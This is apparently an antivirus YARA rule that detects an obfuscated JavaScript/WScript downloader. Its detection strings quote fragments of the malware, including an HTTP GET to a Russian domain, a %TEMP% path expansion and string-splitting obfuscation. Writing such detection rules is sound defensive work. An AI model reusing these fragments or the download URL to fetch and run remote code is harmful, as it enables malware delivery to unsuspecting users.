rule sig_20160428_70d228339e657d0e0c7a9cc0ea76a796 {
  meta:
    description = "datamaliciousorder - file 20160428_70d228339e657d0e0c7a9cc0ea76a796.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "551cd6bab5a4e68a99a07451a861daf307d8245ac0db0c603257fc967e802924"

  strings:
    $s1  = "function DdfAjoUwsLcfSmuTmjUkp(FtkGcxPufKamHmjWwgDjy){IueTgxVeiJeiIsfIhmXur[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function DdfAjoUwsLcfSmuTmjUkp(FtkGcxPufKamHmjWwgDjy){IueTgxVeiJeiIsfIhmXur[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function CitTonIxaVdqXxuDgvGld() {return IueTgxVeiJeiIsfIhmXur[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "return NfjDzdHmbOtbQicCrbDgr - BquTxsGyaIhtTxeBkxPip;};" fullword ascii
    $s5  = "var IueTgxVeiJeiIsfIhmXur = function ElgCpaIipOnnPoiUvgQxp() {return UpfYhoPtmJnlFsaRhhEen[IhcZaxQiaIljDqcGqoJif](\"WScript\"+\"" ascii
    $s6  = "function KskWtqGslPryQzcZmjXty(NfjDzdHmbOtbQicCrbDgr, BquTxsGyaIhtTxeBkxPip){IrtDmlRzxUrpIryAweUix = IrtDmlRzxUrpIryAweUix * 1; " ascii
    $s7  = "OacWdiKkjEpgKsuDvgIfz[UxjEghGmbAjqDmmZtcGmo](\"G\" + \"ET\", \"http://unipan96.ru/xo5ksp\", false);" fullword ascii
    $s8  = "var IueTgxVeiJeiIsfIhmXur = function ElgCpaIipOnnPoiUvgQxp() {return UpfYhoPtmJnlFsaRhhEen[IhcZaxQiaIljDqcGqoJif](\"WScript\"+\"" ascii
    $s9  = "var UpfYhoPtmJnlFsaRhhEen = this[\"WScript\"];" fullword ascii
    $s10 = "function CitTonIxaVdqXxuDgvGld() {return IueTgxVeiJeiIsfIhmXur[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function KskWtqGslPryQzcZmjXty(NfjDzdHmbOtbQicCrbDgr, BquTxsGyaIhtTxeBkxPip){IrtDmlRzxUrpIryAweUix = IrtDmlRzxUrpIryAweUix * 1; " ascii
    $s12 = "function VfgRrpOunRkvBajBwmXoe(){return TkrOgvEsdOhpTkoBjqFrq + \"\";};" fullword ascii
    $s13 = "if (OacWdiKkjEpgKsuDvgIfz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function JcyPppUfyJueZmvFyyVzy() {return ((PwkTirQyiFaiPfaSiqUbs == true) && (PwkTirQyiFaiPfaSiqUbs == YulKdqZjcHkfGidEljChs)) ?" ascii
    $s15 = "function JcyPppUfyJueZmvFyyVzy() {return ((PwkTirQyiFaiPfaSiqUbs == true) && (PwkTirQyiFaiPfaSiqUbs == YulKdqZjcHkfGidEljChs)) ?" ascii
    $s16 = "}while (PwlZnoWyuLptIdeRzaKmc);" fullword ascii
    $s17 = "function LiqMpmDvrCthKnjXisRac(HdiIzjEjzLcdJcuLwiBfj) {var PgeGukIpcTdfNqfEabBbe = (1, 2, 3, 4, 5, HdiIzjEjzLcdJcuLwiBfj); retur" ascii
    $s18 = "var IszOrjXjaIvmYexMjfCds = false;" fullword ascii
    $s19 = "function LiqMpmDvrCthKnjXisRac(HdiIzjEjzLcdJcuLwiBfj) {var PgeGukIpcTdfNqfEabBbe = (1, 2, 3, 4, 5, HdiIzjEjzLcdJcuLwiBfj); retur" ascii
    $s20 = "YulKdqZjcHkfGidEljChs = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}